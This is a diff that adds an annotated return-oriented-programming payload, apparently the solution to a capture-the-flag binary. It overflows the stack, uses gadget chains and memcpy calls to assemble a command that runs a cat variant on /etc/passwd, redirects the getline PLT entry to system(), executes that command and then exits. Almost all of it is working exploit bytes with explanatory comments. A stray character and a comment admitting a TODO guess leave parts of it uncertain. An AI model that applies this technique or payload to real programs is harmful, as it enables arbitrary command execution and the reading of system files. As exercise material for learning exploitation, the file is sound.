@@ -1,0 +1,151 @@
+;;; 131 bytes of garbage to overflow the stack.
+
+0x83:  0000 0000 0040 08b3 ; ret to 0x4008b3
+
+                           ; 4008b3: pop rdi
+                           ;         ret
+0x8b:  0000 0000 0040 316d ; `pop rdi` sets rdi = 0x40316d
+0x93:  0000 0000 0040 08b1 ; ret to 0x4008b1
+
+                           ; 0x4008b1: pop rsi
+                           ;           pop r15
+                           ;           ret
+0x9b:  0000 0000 0040 0444 ; `pop rsi` sets rsi = 0x400444
+0xa3:  2f03 1a01 8876 4706 ; `pop r15` writes garbage to r15
+0xab:  0000 0000 0040 0bc2 ; ret pops 0x400bc2 and jmps there
+
+                           ; 0x400bc2: pop rax
+                           ;           sub al, 0x80
+                           ;           ret
+0xb3:  0000 0000 0000 0081 ; `pop rax` sets rax = 0x81
+                           ; `sub al, 0x80` sets rax = 0x01
+0xbb:  0000 0000 0040 0c38 ; ret pops 0x400c38 and jmps there.
+
+                           ; 0x400c38: xchg edx, eax
+                           ;           ret
+                           ; `xchg edx, eax` sets rdx = 0x01
+0xc3:  0000 0000 0040 0620 ; ret pops 0x400620 and jmps there
+
+                           ; at 0x400620 we call memcpy(0x40316d, 0x400444, 1).
+                           ; this is the first mistake, since 0x400444 is a `1`,
+                           ; and what we want to write is the letter `l`.
+
+;; =============================================================================
+
+0xcb:  0000 0000 0040 08b3 ; ret to 0x4008b3
+
+                           ; 0x4008b3: pop rdi
+                           ;           ret
+0xd3:  0000 0000 0040 3172 ; `pop rdi` sets rdi = 0x403172
+0xdb:  0000 0000 0040 08b1 ; ret to 4008b1
+
+b
+                           ; 0x4008b1: pop rsi
+                           ;           pop r15
+                           ;           ret
+0xe3:  0000 0000 0040 024b ; `pop rsi` sets rsi = 0x40024b
+0xeb:  e3f0 46f6 1622 52c1 ; `pop r15` writes garbage to r15
+0xf3:  0000 0000 0040 0bc2 ; ret to 0x400bc2
+
+                           ; 0x400bc2: pop rax
+                           ;           sub al, 0x80
+                           ;           ret
+0xfb:  0000 0000 0000 0081 ; `pop rax` sets      rax = 0x81
+                           ; `sub al, 0x80` sets rax = 0x01
+0x103: 0000 0000 0040 0c38 ; ret to 0x400c38
+
+                           ; 0x400c38: xchg edx, eax
+                           ;           ret
+                           ; `xchg edx, eax` sets rdx = 0x02.
+0x10b: 0000 0000 0040 0620 ; ret to 0x400620.
+
+                           ; 0x400620 calls memcpy(0x403172, 0x40024b, 1)
+                           ; this writes the character `-` in position 18,
+                           ; which is what we want for the `-p` flag.
+
+;; =============================================================================
+
+
+; we now see a pattern. each block of 9 quadwords form a chain which sets up the
+; first three argument registers and calls memcpy:
+0x113: 0000 0000 0040 08b3
+0x11b: 0000 0000 0040 316c ; first argument
+0x123: 0000 0000 0040 08b1
+0x12b: 0000 0000 0040 0cd5 ; second argument
+0x133: ca04 806a f0be 7490
+0x13b: 0000 0000 0040 0bc2
+0x143: 0000 0000 0000 0081 ; third argument
+0x14b: 0000 0000 0040 0c38
+0x153: 0000 0000 0040 0620 ; call memcpy
+
+
+
+; in the gap between address 0x153 and 0x813, we have an additional 24
+; repetitions of the memcpy block as described above, building the string
+; "/usr/games/lO1cat -p 1 /etc/passwd" starting at address 0x403160.
+
+
+
+; below, the next block of rop-chains overwrites the plt entry of getline() with
+; the runtime address of system using the constant offset of system() relative
+; to getline() in libc. then, it calls system() with the string we built
+; earlier as argument.
+
+0x813: 0000 0000 0040 08b3 ; ret to 0x4008b3
+                           ; 0x4008b3: pop rdi
+                           ;           ret
+0x81b: ffff ffff fffe f510 ; `pop rdi` sets rdi = -68336
+0x823: 0000 0000 0040 08b1 ; ret to 0x4008b1
+                                                                                    
+                           ; 0x4008b1: pop rsi
+                           ;           pop r15
+                           ;           ret
+0x82b: 0000 0000 0040 3040 ; `pop rsi` sets rsi = 0x403040
+0x833: d36c 080f d696 d809 ; `pop r15` writes garbage to r15
+0x83b: 0000 0000 0040 0cc5 ; ret to 0x400cc5
+                                                                                    
+                           ; 0x400cc5: add [rsi], edi
+                           ;           ret
+                           ; this first updates the plt entry of getline to point
+                           ; to system(), and then ..
+0x843: 0000 0000 0040 08b3 ; ret to 0x4008b3
+                                                                                    
+                           ; 0x4008b3: pop rdi
+                           ;         ret
+0x84b: 0000 0000 0040 3160 ; rdi = 0x403160
+0x853: 0000 0000 0040 0640 ; ret to 0x400640 (now pointing to system())
+
+
+; ===============================================================================
+
+; finally, we repeat the above block of rop-chains in order to call exit(0).
+
+0x85b: 0000 0000 0040 08b3 ; system() returns to 0x4008b3
+
+                                                                                    
+                           ; 0x4008b3: pop rdi
+                           ;           ret
+0x863: ffff ffff ffff 47b0 ; rdi = -47184
+0x86b: 0000 0000 0040 08b1 ; ret to 0x4008b1
+                                                                                    
+                                                                                    
+                           ; 0x4008b1: pop rsi
+                           ;           pop r15
+                           ;           ret
+0x873: 0000 0000 0040 3040 ; `pop rsi` sets rsi = 0x403040
+0x87b: f463 87d3 9685 66c1 ; `pop r15` writes garbage to r15
+0x883: 0000 0000 0040 0cc5 ; ret to 0x400cc5
+                                                                                    
+                           ; 0x400cc5: add [rsi], edi
+                           ;           ret
+                           ; this updates the plt entry of getline (now pointing to
+                           ; system) to now point to ??? (TODO: I'm guessing exit?)
+                                                                                    
+0x88b: 0000 0000 0040 08b3 ; ret to 0x4008b3
+                                                                                    
+                           ; 0x4008b3: pop rdi
+                           ;           ret
+0x893: 0000 0000 0000 0000 ; `pop rdi` sets rdi = 0
+0x89b: 0000 0000 0040 0640 ; ret to 0x400640, which is exit() at this point
+
+0x8a3: 0a                  ; newline-terminate the input.
